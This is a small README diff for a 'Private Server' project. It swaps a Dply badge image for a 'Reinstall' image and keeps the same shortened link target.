@@ -1,6 +1,6 @@
 # Private Server 
 
-[![Dply](https://dply.co/b.svg)](https://thinfi.com/0etc) 
+[![Reinstall](https://raw.githubusercontent.com/radium226/private-server/master/reinstall.png)](https://thinfi.com/0etc) 
           
 
 ## Secure Actions
